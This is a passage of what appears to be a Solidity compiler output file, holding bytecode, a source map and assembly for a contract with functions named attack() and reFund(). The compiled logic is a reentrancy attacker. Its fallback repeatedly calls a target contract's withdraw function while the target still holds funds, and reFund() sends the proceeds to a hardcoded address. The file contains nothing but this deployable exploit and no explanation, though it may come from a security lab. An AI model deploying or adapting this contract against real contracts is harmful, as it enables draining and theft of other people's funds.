PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xFD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP1 POP PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x2BC JUMPI PUSH6 0x5AF3107A4000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x1F6 JUMPI PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH6 0x5AF3107A4000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1D9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1ED JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x2BB JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2B6 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST JUMPDEST POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2D0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D9 PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2F7 PUSH2 0x336 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x305 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x30E PUSH2 0x43C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x32C PUSH2 0x507 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0x2797F5291A7FAA3368FF031807B6B70C7BBEEF65 SWAP1 POP PUSH1 0x0 SELFBALANCE GT PUSH2 0x35C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFBALANCE PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x3BC JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x3C1 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x438 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0xD DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x726546756E64206661696C656400000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x4DB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 PUSH7 0x38D7EA4C68000 ADDRESS PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x598 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5AC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH6 0x5AF3107A4000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x62C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x640 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD6 0xB0 OR 0xC6 PUSH22 0x4CA207942F88D217FDE26D79931507B15F2BEC6BBA74 0xC2 PUSH5 0xF081016473 PUSH16 0x6C634300060C00330000000000000000 ",
							"sourceMap": "798:1133:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1663:11;1677:2;;;;;;;;;;;:12;;;1698:4;1677:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1663:41;;1725:1;1719:3;:7;1715:204;;;1772:15;1754:6;;;;;;;;;;1746:23;;;:41;1743:164;;;1806:2;;;;;;;;;;;:11;;;1818:15;1806:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1743:164;;;1871:2;;;;;;;;;;;:11;;;1891:6;;;;;;;;;;1883:23;;;1871:36;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1743:164;1715:204;1626:300;798:1133;;;;;1511:99;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;1097:295;;;:::i;:::-;;1400:103;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;945:144;;;:::i;:::-;;1511:99;1555:7;1581:21;1574:28;;1511:99;:::o;1097:295::-;1141:24;1168:42;1141:69;;1253:1;1229:21;:25;1221:34;;;;;;1267:12;1292:8;1284:22;;1314:21;1284:56;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1266:74;;;1360:7;1351:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1097:295;;:::o;1400:103::-;1442:7;1468:2;;;;;;;;;;;:12;;;1489:4;1468:27;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1461:34;;1400:103;:::o;945:144::-;989:2;;;;;;;;;;;:9;;;1006:20;1036:4;989:53;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1053:2;;;;;;;;;;;:11;;;1065:15;1053:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;945:144::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "332000",
								"executionCost": "42935",
								"totalCost": "374935"
							},
							"external": {
								"attack()": "infinite",
								"getBalance()": "infinite",
								"getEthAmount()": "193",
								"reFund()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 852,
									"end": 894,
									"name": "PUSH",
									"source": 1,
									"value": "A7B6F4CA1D75A987BC1AC27C2ADA78EDFB164084"
								},
								{
									"begin": 819,
									"end": 895,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 819,
									"end": 895,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 819,
									"end": 895,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 819,
									"end": 895,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 819,
									"end": 895,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 819,
									"end": 895,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 929,
									"end": 935,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 929,
									"end": 935,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "DIV",
									"source": 1
								},
								{
									"begin": 929,
									"end": 935,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 929,
									"end": 935,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 902,
									"end": 936,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 902,
									"end": 936,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 902,
									"end": 936,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 902,
									"end": 936,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 902,
									"end": 936,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 902,
									"end": 936,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 798,
									"end": 1931,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220d6b017c6754ca207942f88d217fde26d79931507b15f2bec6bba74c264f0810164736f6c634300060c0033",
									".code": [
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "87D01DF"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "FF0A4DF"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "12065FE0"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "9E5FAAFC"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1663,
											"end": 1674,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1677,
											"end": 1679,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1689,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1677,
											"end": 1689,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1689,
											"name": "PUSH",
											"source": 1,
											"value": "70A08231"
										},
										{
											"begin": 1698,
											"end": 1702,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "STATICCALL",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
